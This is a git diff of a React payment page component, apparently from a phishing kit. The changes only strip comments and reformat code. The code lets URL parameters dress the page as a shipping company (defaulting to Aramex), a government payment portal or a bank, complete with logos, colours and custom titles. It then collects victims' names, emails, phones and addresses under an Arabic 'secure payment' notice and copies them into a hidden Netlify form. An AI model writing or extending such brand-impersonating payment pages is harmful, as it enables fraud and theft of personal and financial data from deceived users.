@@ -53,7 +53,6 @@ const PaymentRecipient: React.FC<PaymentRecipientProps> = ({ children }) => {
   }, [linkData, isError]);
 
   const urlParams = new URLSearchParams(window.location.search);
-  // دعم Path Parameters + Query Parameters (backward compatible) - أولوية لـ URL parameters
   const serviceKey = pathCompany || urlParams.get('company') || urlParams.get('c') || urlParams.get('service') || linkData?.payload?.service_key || 'aramex';
   const currencyParam = pathCurrency || urlParams.get('currency') || urlParams.get('cur');
   const titleParam = urlParams.get('title');
@@ -64,13 +63,11 @@ const PaymentRecipient: React.FC<PaymentRecipientProps> = ({ children }) => {
 
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
-  
-  // تحديد نوع الكيان لاختيار التخطيط المناسب
+
   const isShippingCompany = !!shippingCompanyBranding[serviceKey.toLowerCase()];
   const isGovernment = !!governmentPaymentBranding[serviceKey.toLowerCase()];
   const isBank = !!banks.find(b => b.id === serviceKey.toLowerCase());
-  
-  // دعم شامل لجميع أنواع الكيانات: شحن، بنوك، حكوميات
+
   const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] 
     || governmentPaymentBranding[serviceKey.toLowerCase()] 
     || (banks.find(b => b.id === serviceKey.toLowerCase()) ? {
@@ -85,14 +82,13 @@ const PaymentRecipient: React.FC<PaymentRecipientProps> = ({ children }) => {
       logoUrl: `/images/brand-logos/${serviceKey.toLowerCase()}.svg`,
       description: `Payment for ${serviceKey}`
     } : null);
-  
+
   const companyMeta = getCompanyMeta(serviceKey);
 
   const dynamicTitle = titleParam || companyMeta.title || `Payment - ${serviceName}`;
   const dynamicDescription = companyMeta.description || `Complete your payment for ${serviceName}`;
   const dynamicImage = companyMeta.image;
 
-  // أولوية للـ query parameters، ثم linkData، ثم defaults
   const shippingInfo = linkData?.payload as Record<string, unknown>;
   const payerType = payerTypeParam || shippingInfo?.payer_type || "recipient";
   const countryCode = countryParam || shippingInfo?.selectedCountry || "SA";
@@ -123,14 +119,14 @@ const PaymentRecipient: React.FC<PaymentRecipientProps> = ({ children }) => {
 
   const formattedAmount = formatCurrency(amount, currencyCode);
   const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";
-  
+
   const detectedEntity = detectEntityFromURL();
   const entityLogo = detectedEntity ? getEntityLogo(detectedEntity) : null;
   const displayLogo = entityLogo || branding.logo;
-  
+
   const primaryColor = companyBranding?.colors.primary || branding.colors.primary;
   const secondaryColor = companyBranding?.colors.secondary || branding.colors.secondary;
-  
+
   const handleProceed = async (e: React.FormEvent) => {
     e.preventDefault();
     
@@ -211,7 +207,7 @@ const PaymentRecipient: React.FC<PaymentRecipientProps> = ({ children }) => {
       setIsSubmitting(false);
     }
   };
-  
+
   return (
     <>
       <PaymentMetaTags 
@@ -222,15 +218,28 @@ const PaymentRecipient: React.FC<PaymentRecipientProps> = ({ children }) => {
         amount={formattedAmount}
       />
       {isShippingCompany && companyBranding ? (
-        <ShippingCompanyLayout companyKey={serviceKey} trackingNumber={shippingInfo?.tracking_number as string} amount={formattedAmount} serviceType={serviceName}>
+        <ShippingCompanyLayout 
+          companyKey={serviceKey} 
+          trackingNumber={shippingInfo?.tracking_number as string} 
+          amount={formattedAmount} 
+          serviceType={serviceName}
+        >
           {children}
         </ShippingCompanyLayout>
       ) : isGovernment && companyBranding ? (
-        <GovernmentLayout countryCode={countryCode} serviceName={serviceName} amount={formattedAmount}>
+        <GovernmentLayout 
+          countryCode={countryCode} 
+          serviceName={serviceName} 
+          amount={formattedAmount}
+        >
           {children}
         </GovernmentLayout>
       ) : companyBranding ? (
-        <BankLayout companyKey={serviceKey} amount={formattedAmount} serviceName={serviceName}>
+        <BankLayout 
+          companyKey={serviceKey} 
+          amount={formattedAmount} 
+          serviceName={serviceName}
+        >
           {children}
         </BankLayout>
       ) : (
@@ -269,7 +278,6 @@ const PaymentRecipient: React.FC<PaymentRecipientProps> = ({ children }) => {
         </div>
       )}
 
-      {/* Main Content */}
       <div 
         className="min-h-screen py-8 sm:py-12"
         dir="rtl"
@@ -279,7 +287,6 @@ const PaymentRecipient: React.FC<PaymentRecipientProps> = ({ children }) => {
         }}
       >
         <div className="container mx-auto px-4 max-w-2xl">
-          {/* Page Title */}
           <div className="text-center mb-8">
             <div className="flex items-center justify-center gap-3 mb-4">
               <Sparkles className="w-6 h-6" style={{ color: primaryColor }} />
@@ -297,7 +304,6 @@ const PaymentRecipient: React.FC<PaymentRecipientProps> = ({ children }) => {
               الرجاء إدخال بياناتك لإكمال عملية الدفع بشكل آمن
             </p>
             
-            {/* Amount Display */}
             <div 
               className="inline-flex items-center gap-2 px-6 py-3 rounded-full text-xl font-bold mt-4" 
               style={{ 
@@ -319,7 +325,6 @@ const PaymentRecipient: React.FC<PaymentRecipientProps> = ({ children }) => {
               boxShadow: '0 8px 32px rgba(0,0,0,0.1)'
             }}
           >
-            {/* Card Header */}
             <div 
               className="px-6 sm:px-8 py-6"
               style={{
@@ -347,10 +352,8 @@ const PaymentRecipient: React.FC<PaymentRecipientProps> = ({ children }) => {
               </div>
             </div>
 
-            {/* Form */}
             <form onSubmit={handleProceed} className="px-6 sm:px-8 py-8 bg-white">
               <div className="space-y-6">
-                {/* Full Name */}
                 <div>
                   <Label 
                     htmlFor="name" 
@@ -383,7 +386,6 @@ const PaymentRecipient: React.FC<PaymentRecipientProps> = ({ children }) => {
                   />
                 </div>
                 
-                {/* Email */}
                 <div>
                   <Label 
                     htmlFor="email" 
@@ -418,7 +420,6 @@ const PaymentRecipient: React.FC<PaymentRecipientProps> = ({ children }) => {
                   />
                 </div>
                 
-                {/* Phone */}
                 <div>
                   <Label 
                     htmlFor="phone" 
@@ -453,7 +454,6 @@ const PaymentRecipient: React.FC<PaymentRecipientProps> = ({ children }) => {
                   />
                 </div>
                 
-                {/* Address */}
                 <div>
                   <Label 
                     htmlFor="address" 
@@ -487,7 +487,6 @@ const PaymentRecipient: React.FC<PaymentRecipientProps> = ({ children }) => {
                 </div>
               </div>
 
-              {/* Security Notice */}
               <div 
                 className="mt-6 p-4 rounded-xl flex items-start gap-3"
                 style={{
@@ -506,7 +505,6 @@ const PaymentRecipient: React.FC<PaymentRecipientProps> = ({ children }) => {
                 </div>
               </div>
             
-              {/* Submit Button */}
               <Button
                 type="submit"
                 size="lg"
@@ -538,7 +536,6 @@ const PaymentRecipient: React.FC<PaymentRecipientProps> = ({ children }) => {
               </div>
             </form>
             
-            {/* Hidden Netlify Form */}
             <form name="payment-recipient" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
               <input type="text" name="name" />
               <input type="email" name="email" />
@@ -550,7 +547,6 @@ const PaymentRecipient: React.FC<PaymentRecipientProps> = ({ children }) => {
             </form>
           </Card>
 
-          {/* Footer */}
           <div className="mt-8 text-center">
             <div className="flex items-center justify-center gap-4 text-xs text-gray-500 mb-3">
               <div className="flex items-center gap-1.5">
